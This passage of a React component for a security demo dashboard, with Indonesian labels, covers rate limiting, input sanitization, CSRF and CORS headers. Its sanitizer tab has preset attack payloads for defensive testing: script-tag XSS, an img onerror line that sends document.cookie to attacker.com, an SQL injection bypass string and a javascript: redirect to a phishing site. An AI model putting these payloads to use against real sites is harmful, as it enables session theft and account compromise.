                  className="py-2.5 px-3 bg-amber-600 hover:bg-amber-700 text-white rounded-xl text-xs font-bold flex items-center justify-center space-x-1.5 transition-colors shadow-xs cursor-pointer disabled:opacity-50"
                >
                  {isBurstTesting ? (
                    <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                  ) : (
                    <Flame className="w-3.5 h-3.5 text-amber-200" />
                  )}
                  <span>Simulasi Spam 6x Cepat</span>
                </button>
              </div>

              <div className="p-3 bg-slate-50 border border-slate-200 rounded-xl text-xs space-y-1">
                <div className="flex justify-between">
                  <span className="text-slate-500">Status Terakhir:</span>
                  <span className="font-bold text-slate-800">{rateLimitStatus}</span>
                </div>
                {rateLimitRemaining !== null && (
                  <div className="flex justify-between">
                    <span className="text-slate-500">Sisa Kuota:</span>
                    <span className="font-bold text-indigo-700">{rateLimitRemaining} Request</span>
                  </div>
                )}
              </div>
            </div>

            {/* Live Request Log Console */}
            <div className="bg-slate-900 border border-slate-800 rounded-2xl p-5 text-white shadow-xs space-y-3 flex flex-col justify-between">
              <div>
                <div className="flex items-center justify-between pb-3 border-b border-slate-800">
                  <div className="flex items-center space-x-2">
                    <Terminal className="w-4 h-4 text-emerald-400" />
                    <h3 className="text-xs font-bold uppercase tracking-wider text-slate-300">Live Rate Limit Audit Log</h3>
                  </div>
                  <span className="text-[10px] text-slate-400 font-mono">Realtime Stream</span>
                </div>

                <div className="mt-3 space-y-2 overflow-y-auto max-h-64 font-mono text-[11px]">
                  {rateLimitLogs.length === 0 ? (
                    <p className="text-slate-500 italic text-center py-8">
                      Belum ada aktivitas request. Klik tombol di samping untuk mulai menguji.
                    </p>
                  ) : (
                    rateLimitLogs.map((log) => (
                      <div
                        key={log.id}
                        className={`p-2 rounded-lg flex items-start space-x-2 border ${
                          log.status === 429
                            ? 'bg-rose-950/40 border-rose-900/60 text-rose-300'
                            : 'bg-emerald-950/40 border-emerald-900/60 text-emerald-300'
                        }`}
                      >
                        <span className="text-slate-400 text-[9.5px] shrink-0 mt-0.5">[{log.time}]</span>
                        <span className="font-bold shrink-0">HTTP {log.status}:</span>
                        <span className="text-slate-200 truncate">{log.text}</span>
                      </div>
                    ))
                  )}
                </div>
              </div>

              <div className="pt-3 border-t border-slate-800 text-[10px] text-slate-400 flex items-center justify-between">
                <span>Response Header OWASP:</span>
                <span className="font-mono text-slate-300">Retry-After / X-RateLimit-Remaining</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* SUB-TAB 3: VALIDASI & SANITASI INPUT                                      */}
      {/* ========================================================================= */}
      {activeSubTab === 'sanitizer' && (
        <div className="space-y-6">
          <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-xs space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100">
              <div className="flex items-center space-x-2">
                <Bug className="w-5 h-5 text-emerald-600" />
                <h3 className="text-sm font-bold text-slate-900">Sandbox Pengujian Serangan Injeksi & XSS</h3>
              </div>
              <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-50 text-emerald-700 border border-emerald-200">
                Anti-XSS & Anti-Injection
              </span>
            </div>

            <p className="text-xs text-slate-600 leading-relaxed">
              Ketik atau pilih payload eksploitasi berbahaya di bawah ini. Mesin pembersih Express dan utilitas sanitasi frontend akan melucuti semua tag script, payload inline handler (seperti <code className="bg-slate-100 px-1 py-0.5 rounded text-rose-600">onerror=</code>), dan karakter kontrol tak terlihat.
            </p>

            {/* Attack Preset Buttons */}
            <div>
              <span className="text-[11px] font-bold text-slate-700 block mb-1.5">Pilih Contoh Payload Serangan:</span>
              <div className="flex flex-wrap gap-2">
                <button
                  type="button"
                  onClick={() => setTestInput("<script>alert('pwned')</script>Presensi Kehadiran Siswa")}
                  className="px-2.5 py-1 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-lg text-[11px] font-mono cursor-pointer transition-colors"
                >
                  XSS Script Tag
                </button>
                <button
                  type="button"
                  onClick={() => setTestInput("<img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">")}
                  className="px-2.5 py-1 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-lg text-[11px] font-mono cursor-pointer transition-colors"
                >
                  Img OnError Stealer
                </button>
                <button
                  type="button"
                  onClick={() => setTestInput("admin' OR '1'='1' -- (Injeksi SQL Bypass)")}
                  className="px-2.5 py-1 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-lg text-[11px] font-mono cursor-pointer transition-colors"
                >
                  SQL Injection Token
                </button>
                <button
                  type="button"
                  onClick={() => setTestInput("javascript:void(window.location='https://phishing.site')")}
                  className="px-2.5 py-1 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-lg text-[11px] font-mono cursor-pointer transition-colors"
                >
                  Javascript URI Protocol
                </button>
              </div>
            </div>

            {/* Input Textarea */}
            <div>
              <label className="block text-xs font-semibold text-slate-700 mb-1">
                Input Payload yang Akan Dikirim:
              </label>
              <textarea
                rows={3}
                value={testInput}
                onChange={(e) => setTestInput(e.target.value)}
                className="w-full px-3 py-2 border border-slate-300 rounded-xl font-mono text-xs focus:ring-2 focus:ring-emerald-500 focus:outline-none"
                placeholder="Masukkan teks dengan tag HTML atau script berbahaya..."
              />
            </div>

            <button
              type="button"
              onClick={handleTestSanitization}
              disabled={isTestingSanitizer}
              className="px-4 py-2.5 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-xs font-bold flex items-center space-x-2 transition-colors cursor-pointer"
            >
              {isTestingSanitizer ? (
                <RefreshCw className="w-4 h-4 animate-spin" />
              ) : (
                <Play className="w-4 h-4" />
              )}
              <span>Eksekusi Pembersihan Sanitasi (Client + Server Express)</span>
            </button>

            {/* Results Display */}
            {(sanitizedClientResult || sanitizedServerResult) && (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2">
                <div className="p-3.5 bg-slate-50 border border-slate-200 rounded-xl space-y-1.5">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-bold text-slate-800">Hasil Sanitasi Frontend:</span>
                    <span className="text-[10px] text-emerald-700 font-semibold bg-emerald-50 px-2 py-0.5 rounded-full border border-emerald-200">
                      Safe Text
                    </span>
                  </div>
                  <div className="p-2.5 bg-white border border-slate-200 rounded-lg font-mono text-xs text-slate-800 min-h-[48px] break-words">
                    {sanitizedClientResult || '<Kosong / Dihapus Bersih>'}
                  </div>
                </div>

                <div className="p-3.5 bg-emerald-50/70 border border-emerald-200 rounded-xl space-y-1.5">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-bold text-emerald-950">Hasil Sanitasi Server Express:</span>
                    <span className="text-[10px] text-emerald-800 font-bold bg-emerald-100 px-2 py-0.5 rounded-full">
                      Middleware Verified
                    </span>
                  </div>
                  <div className="p-2.5 bg-white border border-emerald-200 rounded-lg font-mono text-xs text-slate-800 min-h-[48px] break-words">
                    {sanitizedServerResult || '<Kosong / Dihapus Bersih>'}
                  </div>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* SUB-TAB 4: PROTEKSI CSRF                                                 */}
      {/* ========================================================================= */}
      {activeSubTab === 'csrf' && (
        <div className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            {/* CSRF Architecture & Token Info */}
            <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-xs space-y-4">
              <div className="flex items-center justify-between pb-3 border-b border-slate-100">
                <div className="flex items-center space-x-2">
                  <Lock className="w-5 h-5 text-blue-600" />
                  <h3 className="text-sm font-bold text-slate-900">Arsitektur Double-Submit CSRF</h3>
                </div>
                <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-blue-50 text-blue-700 border border-blue-200">
                  HTTP-Only + Header
                </span>
              </div>

              <p className="text-xs text-slate-600 leading-relaxed">
                Setiap permintaan pengubah status (<code className="font-mono text-[11px] bg-slate-100 px-1 py-0.5 rounded text-blue-700">POST</code>, <code className="font-mono text-[11px] bg-slate-100 px-1 py-0.5 rounded text-blue-700">PUT</code>, <code className="font-mono text-[11px] bg-slate-100 px-1 py-0.5 rounded text-blue-700">DELETE</code>) wajib menyertakan token kriptografi yang ditandatangani HMAC. Server mencocokkan header dengan cookie terenkripsi.
              </p>

              <div className="space-y-2 text-xs">
                <div className="flex justify-between py-1.5 border-b border-slate-50">
                  <span className="text-slate-500 font-medium">Nama Cookie:</span>
                  <span className="font-mono font-bold text-slate-800">csrf_token</span>
                </div>
                <div className="flex justify-between py-1.5 border-b border-slate-50">
                  <span className="text-slate-500 font-medium">Flag Keamanan:</span>
                  <span className="font-mono text-emerald-700 font-semibold">HttpOnly; SameSite=Strict</span>
                </div>
                <div className="flex justify-between py-1.5 border-b border-slate-50">
                  <span className="text-slate-500 font-medium">Header Verifikasi:</span>
                  <span className="font-mono text-blue-700 font-bold">X-CSRF-Token</span>
                </div>
              </div>

              <div>
                <span className="text-[11px] font-bold text-slate-700 block mb-1">
                  Active Cryptographic CSRF Token:
                </span>
                <div className="p-2.5 bg-slate-900 text-slate-200 rounded-xl font-mono text-[10px] break-all">
                  {currentCsrf || 'Mengambil token dari server...'}
                </div>
              </div>
            </div>

            {/* Interactive CSRF Attack Simulation */}
            <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-xs space-y-4">
              <div className="flex items-center space-x-2 pb-3 border-b border-slate-100">
                <ShieldAlert className="w-5 h-5 text-blue-600" />
                <h3 className="text-sm font-bold text-slate-900">Uji Validasi vs Penolakan Forgery</h3>
              </div>

              <p className="text-xs text-slate-600 leading-relaxed">
                Bandingkan bagaimana server merespons request legal (disertai token) vs request palsu penyerang (tanpa header proteksi CSRF).
              </p>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <button
                  type="button"
                  onClick={() => handleTestCsrf(true)}
                  disabled={isTestingCsrf}
                  className="py-2.5 px-3 bg-emerald-600 hover:bg-emerald-700 text-white rounded-xl text-xs font-bold flex items-center justify-center space-x-1.5 transition-colors cursor-pointer"
                >
                  {isTestingCsrf ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <CheckCircle2 className="w-3.5 h-3.5" />}
                  <span>Uji Request Legal (Token Disertakan)</span>
                </button>

                <button
                  type="button"
                  onClick={() => handleTestCsrf(false)}
                  disabled={isTestingCsrf}
                  className="py-2.5 px-3 bg-rose-600 hover:bg-rose-700 text-white rounded-xl text-xs font-bold flex items-center justify-center space-x-1.5 transition-colors cursor-pointer"
                >
                  {isTestingCsrf ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <AlertTriangle className="w-3.5 h-3.5" />}
                  <span>Simulasi Serangan (Tanpa Token)</span>
                </button>
              </div>

              {csrfTestResult && (
                <div
                  className={`p-3.5 rounded-xl border text-xs flex items-start space-x-2.5 ${
                    csrfTestResult.success
                      ? 'bg-emerald-50 border-emerald-200 text-emerald-900'
                      : 'bg-rose-50 border-rose-200 text-rose-900'
                  }`}
                >
                  {csrfTestResult.success ? (
                    <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0 mt-0.5" />
                  ) : (
                    <AlertTriangle className="w-4 h-4 text-rose-600 shrink-0 mt-0.5" />
                  )}
                  <div>
                    <p className="font-bold">
                      Status Response: HTTP {csrfTestResult.code} {csrfTestResult.success ? 'OK' : 'Forbidden'}
                    </p>
                    <p className="text-[11px] mt-0.5 opacity-90">{csrfTestResult.message}</p>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* SUB-TAB 5: CORS POLICY & HTTP SECURITY HEADERS                           */}
      {/* ========================================================================= */}
      {activeSubTab === 'cors' && (
        <div className="space-y-6">
          <div className="bg-white border border-slate-200 rounded-2xl p-5 shadow-xs space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100">
              <div className="flex items-center space-x-2">
                <Globe className="w-5 h-5 text-purple-600" />
                <h3 className="text-sm font-bold text-slate-900">Kebijakan CORS & Inspektor Header OWASP</h3>
              </div>
              <span className="px-2 py-0.5 rounded-full text-[10px] font-bold bg-purple-50 text-purple-700 border border-purple-200">
                Whitelisted Origins
              </span>
            </div>

            <p className="text-xs text-slate-600 leading-relaxed">
              Aplikasi berjalan di lingkungan Google Cloud Run dengan domain terisolasi. Hanya request dari origin resmi yang diizinkan melakukan pertukaran data berkredensial.
            </p>

            <button
              type="button"
              onClick={handleTestCorsHeaders}
              disabled={isTestingCors}
              className="px-4 py-2 bg-purple-600 hover:bg-purple-700 text-white rounded-xl text-xs font-bold flex items-center space-x-2 transition-colors cursor-pointer"
            >
              {isTestingCors ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5" />}
              <span>Inspeksi Header Respon Server Sekarang</span>
            </button>

            {corsHeadersResult && (
              <div className="p-3.5 bg-slate-50 border border-slate-200 rounded-xl space-y-2">
                <h4 className="text-xs font-bold text-slate-800">Header Keamanan HTTP yang Ditegakkan:</h4>
                <div className="space-y-1.5 text-xs font-mono">
                  {Object.entries(corsHeadersResult).map(([header, val], idx) => (
                    <div key={idx} className="flex flex-col sm:flex-row sm:items-center justify-between py-1 border-b border-slate-100">
                      <span className="text-slate-600 font-semibold">{header}:</span>
                      <span className="text-purple-700 font-bold break-all">{val}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};
